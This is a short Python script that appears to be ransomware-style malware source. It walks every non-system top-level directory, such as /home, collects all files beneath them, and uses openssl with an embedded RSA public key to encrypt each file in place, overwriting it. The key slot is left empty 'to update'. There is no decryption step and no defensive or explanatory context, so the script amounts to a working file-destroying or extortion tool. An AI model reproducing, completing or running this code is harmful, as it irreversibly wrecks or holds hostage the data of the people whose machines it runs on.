import os
import subprocess
import glob
import base64

# Sample public_key format 
'''pk_string = """MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKKAQEAl5bF268qKK7SQAc9UKOi
BpGgZtrBIT543XZtoh5K5RdxSA+gBvkm1KyWJ6aXHHCaynbcq8xo1VG2KIMlWKNQ
ci+l4N5JhQRs2UrvoTl5fFL9BYOaSZcL/8PUxYghPDlgxXELDFaGLCs5JU06Y1n+
yzoScS0WXXU3cyF959qXH1C3pxXvFGcGGIlFIJPoI/TUjdYupxReSMlQxsBdxE4Y
gHlBSD40mWHKILpC0qSVWQbPqsvGAWH+kLbp36GbPRMjNhAA2BrXyp9Fu+G03/ba
RzCbxFT0DJ9/ZX1U4O1kfOwmwU+YkFzT7vGvzcxrB0hyz5LBK0UQi2ak3NnTKiP5
xwIDAQAB"""'''
# Update the public_key 
pk_string = ''''''
pk = base64.b64decode(pk_string.replace("\n", ""))
result = []

def list_files_recursive(directory):
    files = []
    for dirpath, _, filenames in os.walk(directory):
        for filename in filenames:
            files.extend(glob.glob(os.path.join(dirpath, filename)))
    return files

system_owned_directories = [
    '/lib',
    '/sbin',
    '/etc',
    '/sys',
    '/run',
    '/root',
    '/usr',
    '/bin',
    '/lib32',
    '/libx32',
    '/media',
    '/srv',
    '/tmp',
    '/dev',
    '/mnt',
    '/proc',
    '/var',
    '/opt',
    '/lib64',
    '/boot'
]

current_system_directories = glob.glob("/*")

user_directories = set(current_system_directories) - set(system_owned_directories)

for directory in user_directories:
    files = list_files_recursive(directory)
    result = result + files

for file in result:
    subprocess.Popen(["openssl", "pkeyutl", "-encrypt", "-in", file, "-out", file, "-pubin", "-inkey", "/dev/stdin"], stdin=subprocess.PIPE).communicate(input=pk)
